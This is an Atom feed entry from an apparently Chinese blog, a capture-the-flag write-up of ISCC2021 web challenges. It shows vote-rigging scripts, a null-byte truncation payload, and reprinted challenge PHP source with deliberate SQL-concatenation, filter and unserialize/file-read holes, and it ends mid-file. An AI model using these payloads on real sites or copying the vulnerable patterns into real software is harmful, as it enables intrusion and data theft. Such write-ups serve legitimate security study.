<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>At的小站</title>
  
  
  <link href="http://atkx.top/atom.xml" rel="self"/>
  
  <link href="http://atkx.top/"/>
  <updated>2021-05-27T12:41:10.592Z</updated>
  <id>http://atkx.top/</id>
  
  <author>
    <name>Atkx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ISCC2021 Web WP</title>
    <link href="http://atkx.top/2021/05/27/ISCC2021-Web-WP/"/>
    <id>http://atkx.top/2021/05/27/ISCC2021-Web-WP/</id>
    <published>2021-05-27T12:26:07.000Z</published>
    <updated>2021-05-27T12:41:10.592Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h1><h2 id="ISCC客服冲冲冲（一）"><a href="#ISCC客服冲冲冲（一）" class="headerlink" title="ISCC客服冲冲冲（一）"></a>ISCC客服冲冲冲（一）</h2><blockquote><p>又到了一年一度的ISCC，客服一号为了保住饭碗（被迫）参与了今年的客服海选投票。经过激烈的角逐，客服一号终于凭借着自己多年的客服经验来到决赛的舞台，却发现对手竟是自己？？？<br>请帮助真正的客服一号在投票中取胜，保住客服一号的饭碗！ 题目入口：<a href="http://39.96.91.106:7020/">http://39.96.91.106:7020</a></p></blockquote><p><strong>方法一</strong>：使用连点器<br>设置每秒点击100次，得到flag<br><img src="https://img-blog.csdnimg.cn/20210501144653201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法二</strong>：修改按钮ID<br>F12将两个按钮的id交换<img src="https://img-blog.csdnimg.cn/20210505160357289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>方法三</strong>：<br>js调用click函数，控制台输入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">setInterval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;left_button&quot;</span>).click();&#125;,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><strong>方法四</strong>：刷票</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">local_left_votes=<span class="hljs-number">999999</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210505162648614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h2><blockquote><p>这是什么东西呢？<br>题目入口：<a href="http://39.96.91.106:7030/">http://39.96.91.106:7030</a></p></blockquote><p>下载附件，将jsfuck编码丢到控制台得到flag<br><img src="https://img-blog.csdnimg.cn/20210501112110324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="正则匹配最后的倔强。"><a href="#正则匹配最后的倔强。" class="headerlink" title="正则匹配最后的倔强。"></a>正则匹配最后的倔强。</h2><p>按照提示访问robots.txt，不允许所有人访问/src/code/code.txt<br><img src="https://img-blog.csdnimg.cn/20210502115331384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问/code/code.txt得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>&lt;p&gt;code.txt&lt;/p&gt;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>     <br><span class="hljs-keyword">if</span> (preg_match (<span class="hljs-string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br><br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">9999999</span>)<br>&#123;    <br>    <br><span class="hljs-keyword">if</span> (strpos (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>)<br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Bugku原题，传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”-“才能输出flag。可以使用%00来截断，当ereg函数读到 %00的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p>flag：<br><img src="https://img-blog.csdnimg.cn/20210502115236778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="ISCC{1SCc-202i}"></p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><blockquote><p>登录来上传自己的信息吧！<br>题目入口：<a href="http://39.96.91.106:7010/">http://39.96.91.106:7010</a></p></blockquote><p>这是一道原题： [0CTF 2016] piapiapia,参考<a href="https://www.cnblogs.com/litlife/p/11690918.html#0x02-0ctf-2016-piapiapia">wp</a><br><img src="https://img-blog.csdnimg.cn/20210504124735854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><a href="http://www.zip源码泄露,可直接下载源码./">www.zip源码泄露，可直接下载源码。</a><br><img src="https://img-blog.csdnimg.cn/20210501145644459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>源码如下：</p><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-keyword">Array</span>(<span class="hljs-variable">$username</span>, md5(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::insert(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === md5(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::select(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::filter(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;link = mysql_connect(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br>mysql_select_db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br>mysql_query(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>, <span class="hljs-keyword">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> mysql_fetch_object(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = implode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . implode(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = preg_replace(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">__class__</span>;<br>&#125;<br>&#125;<br>session_start();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> user();<br><span class="hljs-variable">$user</span>-&gt;connect(<span class="hljs-variable">$config</span>);<br><br></code></pre></td></tr></table></figure><p> register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> strlen(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$user</span>-&gt;is_exists(<span class="hljs-variable">$username</span>)) &#123;<br><span class="hljs-variable">$user</span>-&gt;register(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;User name Already Exists&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid 